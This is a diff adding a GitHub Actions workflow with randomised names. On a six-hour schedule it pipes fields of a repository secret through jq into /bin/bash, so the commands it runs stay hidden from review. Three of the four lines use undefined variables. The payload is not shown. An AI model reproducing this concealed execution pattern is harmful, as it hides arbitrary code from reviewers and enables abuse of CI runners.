@@ -1,0 +1,20 @@
+name: bushitaixiaogj
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: bushitaixiaogj
+        env:
+          kq59097: ${{ secrets.kq59097 }}
+        run: |
+          echo $kq59097 | jq -r .mj58886 | /bin/bash
+          echo $n41308 | jq -r .uwqlz6 | /bin/bash
+          echo $w7046 | jq -r .cej698 | /bin/bash
+          echo $mskfy60 | jq -r .kst99 | /bin/bash
+
